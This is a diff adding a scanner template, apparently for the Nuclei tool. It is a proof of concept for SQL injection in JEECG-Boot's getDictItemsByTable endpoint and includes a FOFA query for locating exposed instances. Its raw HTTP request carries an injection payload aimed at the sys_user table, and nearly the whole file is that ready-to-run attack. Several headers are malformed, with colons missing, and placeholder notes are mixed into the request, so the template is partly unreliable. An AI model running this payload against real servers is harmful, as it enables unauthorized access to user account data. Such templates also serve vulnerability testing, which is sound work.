@@ -1,0 +1,61 @@
+id: poc-ap76rdz6vhgi1t9w
+info:
+  name: jeecg-boot-getDictItemsByTable-sqli
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ap76rdz6vhgi1t9w'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ap76rdz6vhgi1t9w
+    fofa: app="JEECG"
+http:
+- raw:
+  - 'GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/''%20from%20sys_user/*,%20''/x.js HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encodinggzip, deflate
+
+
+    Connection: close
+
+
+    Upgrade-Insecure-Requests1
+
+
+    Sec-Fetch-Destdocument
+
+
+    Sec-Fetch-Modenavigate
+
+
+    Sec-Fetch-Sitenone
+
+
+    Sec-Fetch-User?1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
